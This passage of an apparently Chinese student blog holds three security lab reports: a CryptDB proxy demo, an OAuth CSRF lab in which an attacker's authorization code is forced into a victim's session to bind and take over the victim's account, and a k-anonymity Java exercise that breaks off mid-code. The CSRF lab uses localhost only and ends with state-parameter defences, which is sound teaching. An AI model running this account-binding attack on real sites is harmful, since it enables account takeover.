title="CryptDB使用"></a>CryptDB使用</h2><p>本实验中准备了3个终端：</p><ul><li><code>终端1</code>：用于运行CryptDB，在上面显示密文；</li><li><code>终端2</code>：用于从代理端口3306访问数据库，显示用户实际操作状态；</li><li><code>终端3</code>：用于从正常端口访问数据库，显示明文；</li></ul><h3 id="启用proxy"><a href="#启用proxy" class="headerlink" title="启用proxy"></a>启用proxy</h3><p>MySQL使用本地<code>3306</code>端口，CryptDB使用本地<code>3307</code>端口，CryptDB把<code>3307</code>端口的数据处理后通过<code>3306</code>端口与MySQL交互；</p><p>在<code>终端1</code>中输入如下内容，系统返回<code>started</code>即为执行成功；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ /home/levi/cryptdb/bins/proxy-bin/bin/mysql-proxy  \</span><br><span class="line">   --plugins=proxy --event-threads=4             \</span><br><span class="line">   --max-open-files=1024                         \</span><br><span class="line">   --proxy-lua-script=<span class="variable">$EDBDIR</span>/mysqlproxy/wrapper.lua \</span><br><span class="line">   --proxy-address=127.0.0.1:3307                \</span><br><span class="line">   --proxy-backend-addresses=localhost:3306</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212102340.png" alt=""></p><h3 id="启用CryptDB和mysql"><a href="#启用CryptDB和mysql" class="headerlink" title="启用CryptDB和mysql"></a>启用CryptDB和mysql</h3><ol><li><p>在<code>终端2</code>中输入如下命令，连接到本机<code>3306</code>端口的mysql；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u root -p -h 127.0.0.1 -P 3306</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212103018.png" alt=""></p><p>在<code>终端3</code>中输入如下命令，连接到本机<code>3307</code>端口的CryptDB；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u root -p -h 127.0.0.1 -P 3307</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212103110.png" alt=""></p></li></ol><h3 id="CryptDB使用演示"><a href="#CryptDB使用演示" class="headerlink" title="CryptDB使用演示"></a>CryptDB使用演示</h3><ol><li><p>在<code>终端3</code>中查询数据库<code>show databases;</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212110349.png" alt=""></p><p>此时在<code>终端1</code>中显示CryptDB查询数据库的结果；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212110435.png" alt=""></p></li><li><p>在<code>终端3</code>中创建数据库名称为<code>leeyuxun</code> <code>create database leeyuxun;</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212110729.png" alt=""></p><p>此时在<code>终端1</code>中显示CryptDB创建数据库<code>leeyuxun</code>的结果；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212110809.png" alt=""></p></li><li><p>在<code>终端3</code>中打开数据库<code>leeyuxun</code> <code>use leeyuxun;</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212110948.png" alt=""></p><p>此时在<code>终端1</code>中显示CryptDB打开数据库的结果；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212111247.png" alt=""></p></li><li><p>在<code>终端3</code>中新建表<code>users</code>；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table users(id int(2) not null primary key auto_increment,username varchar(40),password varchar(40));</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212111446.png" alt=""></p><p>此时在<code>终端1</code>中显示CryptDB新建表<code>users</code>的结果；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212111743.png" alt=""></p></li><li><p>在<code>终端3</code>中的<code>users</code>表中增加数据；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users(username,password) values(&quot;lizhilin&quot;,&quot;123456&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212112018.png" alt=""></p><p>此时在<code>终端1</code>中显示CryptDB的<code>users</code>表增加数据的结果；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212112100.png" alt=""></p></li><li><p>在<code>终端3</code>中查询表<code>users</code>中的记录<code>select * from users;</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212112247.png" alt=""></p><p>此时在<code>终端1</code>中显示CryptDB的<code>users</code>表查询记录的结果；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212112402.png" alt=""></p></li><li><p>在<code>终端1</code>中发现新创建的<code>users</code>表在Mysql中储存的名字为<code>table_CIGLJIQNCC</code>，在<code>终端2</code>中查询以此命名的表，发现储存数据为密文，表明数据在Mysql端是加密的；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212113558.png" alt=""></p></li></ol><h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><h3 id="修改CryptDB密码"><a href="#修改CryptDB密码" class="headerlink" title="修改CryptDB密码"></a>修改CryptDB密码</h3><p>输入如下语句即可更改CryptDB的密码；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo xdg-open /home/levi/cryptdb/mysqlproxy/wrapper.lua</span><br></pre></td></tr></table></figure><p>更换<code>letmein</code>为其他密码即可；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212114915.png" alt=""></p><h3 id="修改mysql密码"><a href="#修改mysql密码" class="headerlink" title="修改mysql密码"></a>修改mysql密码</h3><p>输入如下语句并按提示输入当前密码，要更改的密码，并确认密码；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysqladmin -u root -p password</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212115503.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 大数据安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CryptDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OAuth CSRF实验</title>
      <link href="/OAuth-CSRF%E5%AE%9E%E9%AA%8C.html"/>
      <url>/OAuth-CSRF%E5%AE%9E%E9%AA%8C.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol><li>通过一个简单的OAuth CSRF攻击实验，来熟悉OAuth的协议流程；</li><li>通过攻击实验来理解OAuth协议的安全性；</li></ol><a id="more"></a><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><ul><li><p>IDE：IntelliJ IDEA 2019.3 x64</p></li><li><p>JDK：1.8</p></li><li><p>OS：Windows 10 x64</p></li><li><p>数据库：mysql-5.6.46.0-winx64</p></li><li><p>服务器：apache-tomcat-8.5.45</p></li><li><p>IdP服务器地址：<a href="http://localhost:8080" target="_blank" rel="noopener">http://localhost:8080</a></p></li><li><p>RP服务器地址：<a href="http://localhost:8081" target="_blank" rel="noopener">http://localhost:8081</a></p></li><li><p>Attack服务器地址：<a href="http://localhost:8081" target="_blank" rel="noopener">http://localhost:8082</a></p><h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1></li></ul><p>通过OAuth CSRF攻击实验，达到如下效果：攻击者通过诱导用户点击恶意链接，使得用户的账号通过OAuth协议与攻击的IdP账号绑定在一起，从而可以使得攻击者用自己的IdP账号通过OAuth登录到用户的账号。  具体步骤如下：</p><ol><li><p>攻击者登录到RP，并且选择绑定自己的IdP账号；</p></li><li><p>RP将攻击者重定向到IdP，攻击者登录IdP，IdP向他显示是否授权RP访问的页面；</p></li><li><p>攻击者在点击”同意授权”之后，截获IdP服务器返回的含有Authorization code参数的HTTP响应;</p></li><li><p>攻击者精心构造一个Web页面，它会触发向IdP发起令牌申请的请求，而这个请求中的Authorization Code参数正是上一步截获到的code；</p></li><li><p>攻击者将这个Web页面放到互联网上，等待或者诱骗受害者来访问；</p></li><li><p>受害者之前登录了RP网站，只是没有把自己的账号和其他社交账号绑定起来。在受害者访问了攻击者准备的这个Web页面，令牌申请流程在受害者的浏览器里被顺利触发，RP从IdP那里获取到access_token，但是这个token以及通过它进一步获取到的用户信息却都是攻击者的；</p></li><li><p>RP将攻击者的IdP账号同受害者的RP账号关联绑定起来；</p></li><li><p>从此以后，攻击者就可以用自己的IdP账号通过OAuth登录到受害者在RP中的账号，冒充受害者的身份执行各种操作。</p><p>具体的攻击流程图如下图所示：</p></li></ol><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205103141.jpg" alt="">备注：第9步中，攻击者应该获取到当前登录状态下用户的cookie，并且将cookie写入请求头中，RP会检查cookie来判断用户是否是登录状态，从而判断是否同意进行绑定请求，但目前从实现上来讲，获取cookie，并检查cookie较为困难，因此在实际实现中，cookie只是已简单的参数形式，传给RP，RP也不检查cookie；</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><p>环境配置没有按照实验要求，使用的是自己之前配置完成的JDK+Mysql+Apache环境，相关参数上述已经说明，但是由于环境和程序源代码出现冲突，做了一些改变，配置步骤不再赘述；</p><h2 id="数据库创建"><a href="#数据库创建" class="headerlink" title="数据库创建"></a>数据库创建</h2><h3 id="RP数据库"><a href="#RP数据库" class="headerlink" title="RP数据库"></a>RP数据库</h3><ol><li><p>建立名为<code>RP</code>的数据库；</p></li><li><p>并且建立<code>user</code>数据表，其字段为：</p><ul><li>id：编号</li><li>userename：RP用户名</li><li>password：RP密码</li><li>idp：身份认证提供商</li></ul><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205132234.png" alt=""></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205131553.png" alt=""></p><h3 id="IdP数据库"><a href="#IdP数据库" class="headerlink" title="IdP数据库"></a>IdP数据库</h3></li><li><p>建立名为<code>shiro</code>的数据库；</p></li><li><p>建立<code>oauth2_client</code>数据表，其字段为：</p><ul><li>id：编号</li><li>client_name：第三方应用名称</li><li>client_id：第三方应用id</li><li>client_secret：第三方应用密钥</li></ul><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205131058.png" alt=""></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205131553.png" alt=""></p></li><li><p>建立oauth2_user表，其字段为：</p><ul><li>id：编号</li><li>username：IdP用户名</li><li>password：IdP密码</li><li>salt：盐</li></ul><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205133229.png" alt=""></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205131553.png" alt=""></p><h3 id="检查RP数据库配置"><a href="#检查RP数据库配置" class="headerlink" title="检查RP数据库配置"></a>检查RP数据库配置</h3></li></ol><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212000948.png" alt=""></p><p>程序中数据库配置正确；</p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String driver=<span class="string">"com.mysql.jdbc.Driver"</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String url=<span class="string">"jdbc:mysql://localhost:3306/rp?characterEncoding=utf8&amp;useSSL=true"</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String username=<span class="string">"root"</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String password=<span class="string">"123456"</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Connection con=<span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><h3 id="检查IdP数据库配置"><a href="#检查IdP数据库配置" class="headerlink" title="检查IdP数据库配置"></a>检查IdP数据库配置</h3><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212001103.png" alt=""></p><p>程序中数据库配置正确；</p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#dataSource configure</span><br><span class="line">connection.url=jdbc:mysql:<span class="comment">//localhost:3306/shiro</span></span><br><span class="line">connection.username=root</span><br><span class="line">connection.password=toor</span><br></pre></td></tr></table></figure><h2 id="服务器启动"><a href="#服务器启动" class="headerlink" title="服务器启动"></a>服务器启动</h2><h3 id="启动IdP服务器"><a href="#启动IdP服务器" class="headerlink" title="启动IdP服务器"></a>启动IdP服务器</h3><p>双击<code>jetty:run</code>，启动服务器；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191206171558.png" alt=""></p><p>运行显示如下图，表示IdP服务器启动成功；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210164537.png" alt=""></p><h3 id="启动RP服务器"><a href="#启动RP服务器" class="headerlink" title="启动RP服务器"></a>启动RP服务器</h3><p>将点击 Edit Configurations，修改RP配置如下；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210164752.png" alt=""></p><p>将application context置为空；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191206172513.png" alt=""></p><p>启动RP服务器，运行显示如下图，表示RP服务器启动成功；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210164925.png" alt=""></p><h2 id="实验流程"><a href="#实验流程" class="headerlink" title="实验流程"></a>实验流程</h2><h3 id="注册RP，获得ClientID和Secret"><a href="#注册RP，获得ClientID和Secret" class="headerlink" title="注册RP，获得ClientID和Secret"></a>注册RP，获得ClientID和Secret</h3><ol><li><p>打开IdP网址<a href="http://localhost:8080/zetark-oauth2-server/client进行第三方应用(RP)注册；" target="_blank" rel="noopener">http://localhost:8080/zetark-oauth2-server/client进行第三方应用(RP)注册；</a></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210165024.png" alt=""></p></li><li><p>点击应用新增，输入第三方应用RP的名称<code>testApp</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212000208.png" alt=""></p><p>由于未将id设置为自动递增，报错如下：</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210110527.png" alt=""></p><p>更改数据库配置，将id设置为自动递增；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210110847.png" alt=""></p><p>再次点击新增应用，注册完毕获得客户端ID(client_id)<code>88f55e00-5f78-44e1-abfb-fa6c5368366d</code>和客户端安全KEY(clinet_secret)<code>788639e3-8355-4fa8-aa38-ae04670ac30b</code>，RP需要记录这两个参数，用于后续的OAuth认证，即需要在源代码中一些位置更改上述的两个参数，这里只举例一处；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211233406.png" alt=""></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212004236.png" alt=""></p></li></ol><h3 id="攻击者：注册IdP账号"><a href="#攻击者：注册IdP账号" class="headerlink" title="攻击者：注册IdP账号"></a>攻击者：注册IdP账号</h3><ol><li><p>打开IdP网址<a href="http://localhost:8080/zetark-oauth2-server/user进行账号注册，该账号将用于绑定RP账号；" target="_blank" rel="noopener">http://localhost:8080/zetark-oauth2-server/user进行账号注册，该账号将用于绑定RP账号；</a></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210165401.png" alt=""></p></li><li><p>点击用户新增，注册用户<code>attack</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210165635.png" alt=""></p></li><li><p>注册成功后，显示用户；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210165722.png" alt=""></p></li></ol><h3 id="用户注册RP账号"><a href="#用户注册RP账号" class="headerlink" title="用户注册RP账号"></a>用户注册RP账号</h3><ol><li><p>打开RP网站<a href="http://localhost:8081/进行账号注册；" target="_blank" rel="noopener">http://localhost:8081/进行账号注册；</a></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210165947.png" alt=""></p></li><li><p>到注册页面，设置用户名为<code>Leeyuxun</code>，点击注册；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210170327.png" alt=""></p></li><li><p>注册成功后，返回登录页面，进行登录；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210170204.png" alt=""></p></li><li><p>调试窗口显示登录成功；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212005954.png" alt=""></p></li><li><p>网页显示登陆成功；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210180148.png" alt=""></p></li></ol><h3 id="攻击者完成攻击前的状态"><a href="#攻击者完成攻击前的状态" class="headerlink" title="攻击者完成攻击前的状态"></a>攻击者完成攻击前的状态</h3><ol><li><p>在IdP账号没有绑定RP账号<code>testApp</code>的情况下，用IdP账号<code>attacker</code>来登录RP网站，点击使用IdP授权，发现IdP显示，应用<code>testApp</code>正在请求接入；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211235615.png" alt=""></p></li><li><p>输入IdP账号，用户名<code>attack</code>，点击登录并授权，验证通过后会显示该用户未绑定。实际上<code>attack</code>用户只是IdP用户，并没有绑定过RP用户，因此无法用IdP的账号来登录RP网站；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210234832.png" alt=""></p></li></ol><h3 id="攻击者的操作流程"><a href="#攻击者的操作流程" class="headerlink" title="攻击者的操作流程"></a>攻击者的操作流程</h3><ol><li><p>下面进行CSRF攻击，首先让用户<code>Leeyuxun</code>登录到RP网站；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210235710.png" alt=""></p></li><li><p>攻击者在用户<code>Leeyuxun</code>保持登录状态时，打开绑定用户的链接<a href="http://localhost:8080/zetark-oauth2-server/authorize?client_id=88f55e00-5f78-44e1-abfb-fa6c5368366d&amp;response_type=code&amp;redirect_uri=http://localhost:8081/accesstoken.jsp&amp;scope=bindlogin" target="_blank" rel="noopener">http://localhost:8080/zetark-oauth2-server/authorize?client_id=88f55e00-5f78-44e1-abfb-fa6c5368366d&amp;response_type=code&amp;redirect_uri=http://localhost:8081/accesstoken.jsp&amp;scope=bindlogin</a></p></li><li><p>输入攻击者<code>attack</code>在IdP上的账号，点击登录并授权；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211235504.png" alt=""></p></li><li><p>验证通过后，获得返回的授权码code，位于url地址中，为<code>38575af7f999713cffce720e74409ad6</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211234803.png" alt=""></p></li><li><p>将code放入事先写好的攻击项目中，并build运行<code>attcak</code>项目；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212001438.png" alt=""></p></li></ol><h3 id="用户登录RP并访问攻击者的网站"><a href="#用户登录RP并访问攻击者的网站" class="headerlink" title="用户登录RP并访问攻击者的网站"></a>用户登录RP并访问攻击者的网站</h3><ol><li><p>等待用户访问攻击者的网站，点击恶意链接<a href="http://localhost:8082/attack，攻击者伪造一个post请求，发送给RP网站http://localhost:8081/binding_request，其中post请求含有：授权码code，受害者RP的用户名rp_user_name；" target="_blank" rel="noopener">http://localhost:8082/attack，攻击者伪造一个post请求，发送给RP网站http://localhost:8081/binding_request，其中post请求含有：授权码code，受害者RP的用户名rp_user_name；</a></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211105853.png" alt=""></p></li><li><p>当用户点击恶意链接时，当前RP用户就会与攻击者的IdP账号绑定，完成CSRF攻击；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211105825.png" alt=""></p></li></ol><h3 id="攻击者入侵用户的RP账户"><a href="#攻击者入侵用户的RP账户" class="headerlink" title="攻击者入侵用户的RP账户"></a>攻击者入侵用户的RP账户</h3><ol><li><p>攻击者用攻击者的IdP账号成功登录用户的RP账号；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211235504.png" alt=""></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211235408.png" alt=""></p></li></ol><h1 id="实验结论"><a href="#实验结论" class="headerlink" title="实验结论"></a>实验结论</h1><p>由于OAuth2的认证流程是分为好几步来完成的，当第三方应用在收到一个GET请求时，除了能知道当前用户的cookie，以及URL中的Authorization Code之外，难以分辨出这个请求到底是用户本人的意愿，还是攻击者利用用户的身份伪造出来的请求。因此，攻击者可使用移花接木的手段，提前准备一个含有自己的Authorization Code请求，并让受害者的浏览器来接着完成后续的令牌申请流程；</p><h2 id="攻击者攻击前提条件"><a href="#攻击者攻击前提条件" class="headerlink" title="攻击者攻击前提条件"></a>攻击者攻击前提条件</h2><ol><li>在攻击过程中，受害者在RP上的用户会话(User Session)必须是有效的，即受害者在受到攻击前已经登录了RP；</li><li>整个攻击必须在短时间内完成，因为OAuth2提供者颁发的Authorization Code有效期很短，OAuth2官方推荐的时间是不大于10分钟，而一旦Authorization Code过期那么后续的攻击也就不能进行下去了；</li><li>一个Authorization Code只能被使用一次，如果OAuth2提供者收到重复的Authorization Code，它会拒绝当前的令牌申请请求。不止如此，根据OAuth2官方推荐，它还可以把和这个已经使用过的Authorization Code相关联的access_token全部撤销掉，进一步降低安全风险；</li></ol><h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><p>要防止这样的攻击其实很容易，作为第三方应用的开发者，只需在OAuth2认证过程中加入state参数，并验证它的参数值即可。具体细节如下：</p><p>在将用户重定向到OAuth2的Authorization Endpoint去的时候，为用户生成一个随机的字符串，并作为state参数加入到URL中。在收到OAuth2服务提供者返回的Authorization Code请求的时候，验证接收到的state参数值。如果是正确合法的请求，那么此时接受到的参数值应该和上一步提到的为该用户生成的state参数值完全一致，否则就是异常请求。state参数值需要具备下面几个特性：</p><ol><li><strong>不可预测性</strong>：足够的随机，使得攻击者难以猜到正确的参数值</li><li><strong>关联性</strong>：state参数值和当前用户会话（user session）是相互关联的</li><li><strong>唯一性</strong>：每个用户，甚至每次请求生成的state参数值都是唯一的</li><li><strong>时效性</strong>：state参数一旦被使用则立即失效</li></ol>]]></content>
      
      
      <categories>
          
          <category> 大数据安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OAuth </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>k-匿名隐私保护实验</title>
      <link href="/k-%E5%8C%BF%E5%90%8D%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4%E5%AE%9E%E9%AA%8C.html"/>
      <url>/k-%E5%8C%BF%E5%90%8D%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4%E5%AE%9E%E9%AA%8C.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol><li>理解基本的k-匿名算法；</li><li>通过相关程序实现对数据表元组的k-匿名处理；</li></ol><a id="more"></a><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><ul><li><p>编程语言：Java</p></li><li><p>硬件设备：IDEA，JDK版本1.8  </p></li></ul><h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><h2 id="k-匿名的核心思想"><a href="#k-匿名的核心思想" class="headerlink" title="k-匿名的核心思想"></a>k-匿名的核心思想</h2><p>K-匿名的核心思想是设法切断数据表中准标识符与敏感属性之间的一对一关系来保护隐私属性。使得在一个数据表中，一条记录的准标识符至少有k-1条记录的准标识符与之相同。即如果使用准标识符查询的话，我们得到的查询结果应至少包含k条记录，并且这k条记录的准标识符完全相同，攻击者进而无法通过准标识符推理出隐私数据。</p><h2 id="基本的k-匿名算法"><a href="#基本的k-匿名算法" class="headerlink" title="基本的k-匿名算法"></a>基本的k-匿名算法</h2><ul><li>输入：原始数据表T<sub>p</sub>, 匿名参数k；</li><li>输出：满足k-匿名的数据表T<sub>k</sub>；</li><li>步骤：<ol><li>从T<sub>p</sub>中依次读取k条记录；</li><li>针对原始记录的属性信息对标识符和不希望发布的信息做抑制处理；</li><li>对准标识符中的属性进行泛化，直到k条记录的准标识符完全相同，将处理后的这k条记录存入到T<sub>k</sub>中；</li><li>重复1-3步骤，直到数据全部被处理，若剩余的记录不足k条做抑制处理；  </li></ol></li></ul><h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><ol><li>给定原始数据集，根据基本的k-匿名算法编写程序对其实现简单的k-匿名处理，使得匿名化处理后的表通过准标识符查询出来的记录至少有k条；</li><li>给出实验报告说明和源代码；</li></ol><h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol><li><p>没有按照实验教程给出的步骤去做，做了一点创新，重新生成了一个新的数据文件及集org，共有1000条数据，由于数据量比较大，这里不做展示，已经放在了附件中；</p></li><li><p>编写k-匿名处理程序对原始数据集进行k-匿名处理，假设k=2，在原始数据集中按顺序依次选择2条数据记录后，首先需要去除这2条数据记录中的标识符属性No，使之不会出现在k-匿名后的数据记录中，接着需要对这2条数据记录中的准标识符属性<code>idNumber</code>、<code>sex</code>、<code>age</code>、<code>height</code>进行泛化处理。</p></li><li><p>这里做的和实验指导上的不相同，实验指导上没有将<code>idNumber</code>列为准标识符，本实验也没有将它作为准标识符属性，身份证号是每个人的唯一标志，不能作为准标识符。但是为了提高数据的匿名性，本实验将<code>idNumber</code>的第一个字符作为准标识符，即产生了四个准标识符，具体如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Operation.java */</span></span><br><span class="line">    <span class="comment">//只读取org文件中idNumber的第一位到setIdNumber中</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; org_list.size(); i++) &#123;</span><br><span class="line">        Org org=<span class="keyword">new</span> Org();</span><br><span class="line">        String org_ori=org_list.get(i);</span><br><span class="line">        String elements[]=org_ori.split(<span class="string">","</span>);</span><br><span class="line">        org.setNo(Integer.parseInt(elements[<span class="number">0</span>]));</span><br><span class="line">        org.setIdNumber(elements[<span class="number">1</span>].charAt(<span class="number">0</span>));</span><br><span class="line">        org.setSex(elements[<span class="number">2</span>].charAt(<span class="number">0</span>));</span><br><span class="line">        org.setAge(Integer.parseInt(elements[<span class="number">3</span>]));</span><br><span class="line">        org.setHeight(Integer.parseInt(elements[<span class="number">4</span>]));</span><br><span class="line">        org.setDisease(elements[<span class="number">5</span>]);</span><br><span class="line">        orgs.add(org);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对k条记录中的准标识符进行泛化处理,包括idNumber的第一位idNumberFirst</span></span><br><span class="line">K temp=generalize(org_k);  </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> m = <span class="number">0</span>; m &lt; k; m++) &#123;</span><br><span class="line">K out=<span class="keyword">new</span> K();</span><br><span class="line">out.setIdNumberFirst(temp.getIdNumberFirst());</span><br><span class="line">out.setSex(temp.getSex());</span><br><span class="line">out.setAge(temp.getAge());</span><br><span class="line">out.setHeight(temp.getHeight());</span><br><span 